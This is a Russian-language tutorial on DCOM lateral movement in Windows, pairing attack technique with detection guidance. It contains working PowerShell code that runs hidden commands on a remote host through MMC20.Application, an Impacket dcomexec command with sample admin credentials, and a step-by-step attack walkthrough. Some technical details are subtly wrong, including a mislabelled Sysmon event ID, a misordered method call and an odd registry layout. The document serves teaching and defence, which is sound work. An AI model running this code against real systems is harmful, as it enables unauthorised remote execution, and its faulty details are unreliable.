# DCOM Execution: Архитектура, эксплуатация и детекция горизонтального перемещения

## Контекст и базовые понятия

Distributed Component Object Model (DCOM) представляет собой расширение технологии Component Object Model (COM), позволяющее объектам программного обеспечения взаимодействовать через сетевые границы. В контексте информационной безопасности и тестирования на проникновение DCOM является критическим вектором горизонтального перемещения (Lateral Movement), так как он позволяет атакующему выполнять код на удаленной машине в контексте легитимного системного процесса, используя стандартные механизмы удаленных вызовов процедур (RPC).

Для понимания механизмов эксплуатации необходимо разграничить базовые понятия, которые часто смешиваются в общей терминологии.

**COM (Component Object Model)** — это архитектурный стандарт Microsoft, определяющий способ взаимодействия программных компонентов. Ключевая особенность COM — независимость от языка программирования и бинарная совместимость. Объект COM инкапсулирует данные и методы в интерфейс, идентифицируемый GUID (CLSID). Локально взаимодействие происходит через вызовы функций в памяти процесса.

**DCOM (Distributed COM)** — протокол, расширяющий COM для работы в распределенных системах. DCOM добавляет слой абстракции, который преобразует локальные вызовы интерфейсов в сетевые пакеты RPC. Это позволяет клиентскому приложению на одной машине вызывать методы серверного объекта на другой машине так, будто они находятся в одном адресном пространстве.

**RPC (Remote Procedure Call)** — фундаментальный транспортный слой. DCOM не является самостоятельным протоколом передачи данных; он инкапсулирует вызовы методов COM внутри RPC-пакетов. Обычно DCOM использует порт 135 (Endpoint Mapper) для начального рукопожатния и динамически выделяемые порты для передачи данных.

**Lateral Movement (Горизонтальное перемещение)** — тактика атаки, при которой злоумышленник перемещается по сети, используя скомпрометированные учетные данные. DCOM позволяет осуществлять это перемещение без создания новых файлов на диске (fileless), так как код выполняется в памяти легитимного процесса-хоста.

Различие между легитимным использованием и эксплуатацией заключается в цели и контексте. Легитимное использование DCOM предназначено для интеграции функциональности между приложениями (например, вставка Excel-таблицы в Word). Эксплуатация DCOM для lateral movement заключается в намеренном выборе объектов, имеющих методы, способные запускать внешние процессы или выполнять код (например, `ExecuteShellCommand` в MMC20.Application), с использованием учетных данных администратора.

| Сущность | Уровень абстракции | Основной механизм | Область применения | Индикаторы аномалии |
| :--- | :--- | :--- | :--- | :--- |
| **COM** | Локальный процесс | Вызов методов через vtable в памяти | Взаимодействие DLL/EXE внутри одной ОС | Отсутствует (нормальная работа) |
| **DCOM** | Сетевой уровень | Инкапсуляция вызовов COM в RPC-пакеты | Удаленное управление объектами | Динамические порты, необычные CLSID |
| **RPC** | Транспортный уровень | Маршалинг данных и вызовов процедур | Базовая коммуникация Windows-сервисов | Высокая нагрузка на порт 135/445 |
| **WMI** | Административный уровень | WMI Provider (COM-объект) | Управление конфигурацией и мониторинг | Создание экземпляров классов Win32_Process |

Путаница между DCOM и WMI часто возникает, поскольку оба механизма используют RPC для удаленного выполнения. Однако WMI (Windows Management Instrumentation) является специализированным сервисом администрирования, в то время как DCOM — это общая инфраструктура для любых COM-объектов. Эксплуатация DCOM часто менее заметна в стандартных логах WMI, но оставляет следы в логах активации COM-объектов.

## Внутреннее устройство предмета

DCOM Execution как техника горизонтального перемещения опирается на архитектуру COM-объектов, их регистрацию в реестре и механизм активации. Для понимания того, как именно происходит эксплуатация, необходимо разобрать структуру COM-объекта, процесс активации и конкретные уязвимые классы.

### Архитектура COM-объекта и регистрация

Каждый COM-объект идентифицируется двумя ключевыми GUID: **CLSID** (Class ID) — идентификатор класса, и **ProgID** (Programmatic Identifier) — человекочитаемое имя (например, `MMC20.Application`).

Регистрация объекта происходит в реестре Windows по пути `HKEY_CLASSES_ROOT\CLSID\{CLSID}`. Критическим подразделом является `InprocServer32` или `LocalServer32`, указывающий на DLL или EXE, реализующий объект. Для удаленной активации (DCOM) требуется настройка прав доступа в подразделе `AppID`.

```text
HKEY_CLASSES_ROOT
└── CLSID
    └── {CLSID_Объекта}
        ├── AppID
        │   └── {AppID_Объекта}
        │       ├── InprocServer32 (или LocalServer32)
        │       └── Permission
        │           └── AccessPermission (ACL для RemoteLaunch)
        └── ProgID
            └── "MMC20.Application"
```

Для того чтобы объект мог быть активирован удаленно, администратор (или установщик ПО) должен предоставить права на `RemoteLaunch` и `RemoteActivation` соответствующим группам (обычно `Administrators` или `Authenticated Users`). Если эти права отсутствуют, DCOM-вызов будет отклонен на этапе аутентификации.

### Механизм активации и маршалинг

Процесс DCOM-вызова состоит из нескольких фаз:

1.  **Resolution (Разрешение):** Клиент запрашивает у RPC Endpoint Mapper (порт 135) адрес сервера, хостящего нужный AppID.
2.  **Authentication (Аутентификация):** Устанавливается безопасное соединение (обычно NTLM или Kerberos). Проверяются ACL реестра на право удаленной активации.
3.  **Activation (Активация):** Сервер запускает процесс сервера (если он не запущен) и создает экземпляр объекта.
4.  **Marshalling (Маршалинг):** Параметры вызова метода упаковываются в RPC-пакет.
5.  **Execution (Выполнение):** Серверный процесс выполняет метод.
6.  **Unmarshalling (Размаршалинг):** Результат возвращается клиенту.

При эксплуатации для lateral movement атакующий использует PowerShell или другие скриптовые языки для создания экземпляра объекта на удаленной машине. Ключевой момент — выбор объекта, который позволяет выполнять произвольные команды.

### Уязвимые COM-объекты

Не все COM-объекты подходят для выполнения кода. Требуются объекты, экспонирующие методы, способные запускать процессы или загружать библиотеки. Наиболее известные примеры:

| COM Object (ProgID) | CLSID | Ключевой метод | Описание уязвимости |
| :--- | :--- | :--- | :--- |
| **MMC20.Application** | `{96E8A950-C51F-11D3-8B64-0080C73E7CBF}` | `ExecuteShellCommand` | Позволяет запускать любые команды через интерфейс MMC. |
| **ShellWindows** | `{9BA05972-F6A8-11CF-A442-00A0C90A80CB}` | `Item` / `Navigate` | Доступ к коллекций открытых окон Explorer. |
| **Excel.Application** | `{00024500-0000-0000-C000-000000000046}` | `Run` / `DDE` | Выполнение макросов или DDE-команд. |
| **Outlook.Application** | `{0006F03A-0000-0000-C000-000000000046}` | `CreateObject` | Создание вложенных объектов, потенциально с вредоносным кодом. |
| **COpenControlPanel** | `{06622D85-6856-4460-8DE1-A81921B41C4B}` | `OpenControlPanel` | Запуск элементов панели управления, которые могут содержать скрипты. |

Объект `MMC20.Application` является наиболее классическим примером. Его метод `ExecuteShellCommand` принимает параметры: `Command`, `Parameters`, `WorkingDirectory`, `ShowCmd`. Это напрямую эмулирует функцию `ShellExecute`.

### Инварианты и ограничения

*   **Права доступа:** По умолчанию только администраторы могут удаленно активировать COM-объекты. Эксплуатация требует учетных данных с правами локального администратора на целевой машине.
*   **Firewall:** DCOM использует динамические порты. Для успешной эксплуатации необходимо разрешить RPC-трафик (порт 135 и динамический диапазон) между узлами.
*   **Archeology:** Многие старые COM-объекты были отключены или изменены в современных версиях Windows (например, в Windows 10/11 и Server 2019+ некоторые методы DDE были отключены по умолчанию из-за уязвимостей).

## Применение и работа с предметом

На практике работа с DCOM для тестирования на проникновение или расследования инцидентов включает три этапа: обнаружение уязвимых объектов, создание экземпляра и выполнение метода.

### Инструментарий и методы эксплуатации

Атакующие и пентестеры используют скриптовые инструменты, так как нативные API COM доступны через .NET Framework и PowerShell.

**1. PowerShell (Native)**
PowerShell предоставляет доступ к .NET классу `Activator`, который позволяет создавать экземпляры COM-объектов удаленно. Это не требует сторонних утилит.

```powershell
# Создание экземпляра MMC20.Application на удаленной машине
$comObject = [System.Activator]::CreateInstance(
    [type]::GetTypeFromProgID("MMC20.Application", "TargetIP")
)

# Вызов метода ExecuteShellCommand
# Параметры: Command, Parameters, WorkingDirectory, ShowCmd
$comObject.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c whoami",
    "0" # SW_HIDE
)
```

**2. Impacket (Python)**
Библиотека Impacket содержит скрипт `dcomexec.py`, который автоматизирует процесс. Он использует библиотеку `impacket.dcom` для построения RPC-пакетов.

```bash
# Синтаксис: dcomexec.py <domain>/<user>:<password>@<target>
python3 dcomexec.py 'domain/administrator':'Password123!'@192.168.1.100
```

**3. Cobalt Strike / Empire**
В рамках фреймворков для red teaming существуют модули, инкапсулирующие DCOM-вызовы. Например, в Cobalt Strike используется `execute-assembly` с загрузкой DCOM-модулей, а в Empire — `invoke-dcom`.

### Паттерны детекции (Blue Team)

Для обнаружения DCOM lateral movement необходимо мониторить несколько источников событий.

**1. Event ID 1001 (COM Activation)**
В Windows Event Log, в разделе `Applications and Services Logs\Microsoft\Windows\COM\Operational`, регистрируется каждый акт активации COM-объекта.
*   **Event ID 1001:** Успешная активация.
*   **Event ID 1002:** Неудачная попытка.
*   **Ключевые поля:** `AppID`, `CLSID`, `ClientProcessID`, `ClientMachine`.

Аномалией является активация подозрительных AppID (например, тех, что связаны с Office или MMC) с удаленных машин, которые обычно не являются клиентами для этих сервисов.

**2. Sysmon Event ID 10 (NetworkConnection)**
Так как DCOM использует RPC, на целевой машине будет установлено сетевое соединение.
*   **Protocol:** TCP
*   **DestinationPort:** Динамический (обычно > 1024)
*   **InitiatedByService:** `svchost.exe` (часто с ключом `netsvcs` или `RpcSs`)
*   **ParentProcess:** `mmc.exe` или `explorer.exe` (в зависимости от объекта)

**3. Process Creation (Sysmon Event ID 1)**
При активации некоторых объектов (особенно LocalServer32) на целевой машине может запускаться новый процесс.
*   **Parent:** `svchost.exe`
*   **Child:** `mmc.exe`, `excel.exe`, `outlook.exe`
*   **CommandLine:** Может содержать скрытые параметры или быть пустым, если процесс запущен как служба.

### Типичные ошибки и подводные камни

*   **Ошибки маршалинга:** Если объект ожидает специфические типы данных (например, структуры вместо строк), вызов завершится ошибкой `RPC_E_TYPE_MISMATCH`. Пентестер должен знать сигнатуру метода.
*   **Блокировка интерфейсов:** Некоторые объекты требуют, чтобы клиент был в том же домене или имел специфические права на DCOM-права (не только на запуск, но и на взаимодействие).
*   **Антивирусные эвристики:** Современные EDR решают поведенческие паттерны: создание COM-объекта -> вызов метода запуска процесса -> запуск cmd.exe. Это часто блокируется как "Suspicious COM Execution".

## Сквозной практический пример: Lateral Movement via MMC20.Application

**Исходные условия:**
*   **Атакующий:** Машина с IP `10.0.0.50`, пользователь `attacker\pentester` (локальный администратор на целевой машине).
*   **Цель:** Windows 10 Pro машина с IP `10.0.0.100`.
*   **Инструмент:** PowerShell 5.1 (стандартный, без сторонних модулей).
*   **Цель:** Выполнить `whoami` на целевой машине и записать результат в файл `C:\temp\dcom_result.txt`.

**Шаг 1: Проверка доступности RPC и прав**
Перед созданием объекта необходимо убедиться, что порт 135 доступен и учетные данные валидны.

```powershell
# Проверка связи с Endpoint Mapper
Test-NetConnection -ComputerName 10.0.0.100 -Port 135
```
*Ожидаемый вывод:* `TcpTestSucceeded : True`. Если False, DCOM не сработает из-за брандмауэра.

**Шаг 2: Создание экземпляра COM-объекта**
Используем `[Activator]::CreateInstance` для удаленной активации `MMC20.Application`.

```powershell
# Инициализация переменной для хранения объекта
# GetTypeFromProgID возвращает Type-объект, описывающий COM-класс
$progID = "MMC20.Application"
$targetIP = "10.0.0.100"

try {
    $comType = [type]::GetTypeFromProgID($progID, $targetIP)
    $comObject = [System.Activator]::CreateInstance($comType)
    Write-Host "DCOM Object instantiated successfully."
} catch {
    Write-Error "Failed to instantiate DCOM object: $_"
    exit
}
```
*Ожидаемый вывод:* `DCOM Object instantiated successfully.` Если прав недостаточно, возникнет исключение `COMException: Access is denied`.

**Шаг 3: Выполнение команды через ExecuteShellCommand**
Метод `ExecuteShellCommand` находится в иерархии `Document.ActiveView`.

```powershell
# Формирование команды
$command = "cmd.exe"
$arguments = "/c whoami > C:\temp\dcom_result.txt"
$workingDir = $null
$showCmd = 0 # SW_HIDE (скрытое окно)

# Вызов метода
# Внимание: MMC20.Application требует доступа к Document.ActiveView
try {
    $comObject.Document.ActiveView.ExecuteShellCommand(
        $command,
        $arguments,
        $workingDir,
        $showCmd
    )
    Write-Host "Command executed via DCOM."
} catch {
    Write-Error "Execution failed: $_"
}
```
*Ожидаемый вывод:* `Command executed via DCOM.` В этот момент на целевой машине `svchost.exe` запустит `mmc.exe`, который выполнит команду.

**Шаг 4: Верификация результата**
Проверка наличия файла на целевой машине (если есть доступ к файловой системе) или мониторинг событий.

```powershell
# Проверка процесса на целевой машине через WMI (для демонстрации успеха)
Get-WmiObject -Class Win32_Process -ComputerName 10.0.0.100 -Filter "Name='mmc.exe'" | 
    Select-Object ProcessId, CommandLine, ParentProcessId
```
*Ожидаемый вывод:* Список процессов `mmc.exe` с родительским процессом `svchost.exe` и соответствующим PID.

**Ожидаемый вывод примера:**
Пример демонстрирует, что выполнение кода происходит без передачи бинарных файлов на целевую машину. Весь payload (команда) передается в виде параметров RPC-вызова. На стороне защиты это будет выглядеть как легитимная активация MMC-объекта администратором, что затрудняет детекцию без анализа контекста (кто инициировал, откуда).

## Аналитический вывод

DCOM Execution представляет собой мощный вектор горизонтального перемещения, использующий легитимные механизмы Windows для обхода традиционных средств защиты, ориентированных на файлы и процессы. В отличие от PsExec, который создает новые сервисы и оставляет четкие следы в логах событий, DCOM-эксплуатация маскируется под административное управление COM-объектами. Ключевая сложность для защитников заключается в том, что активация COM-объектов является нормальным поведением в корпоративных средах (например, для работы Office-приложений).

Для эффективной детекции необходимо комбинировать мониторинг событий активации COM (Event ID 1001) с анализом сетевых соединений (Sysmon Event ID 10) и созданием процессов (Sysmon Event ID 1). Аномалии выявляются по нехарактерным AppID, необычным источникам активации (например, активация Office-объектов с серверов баз данных) и последующему запуску подозрительных дочерних процессов. Для пентестеров DCOM остается актуальным инструментом, особенно в средах с включенным LSA Protection или ограниченным использованием WMI, однако современные EDR-системы все чаще блокируют такие попытки на основе поведенческого анализа цепочки вызовов.
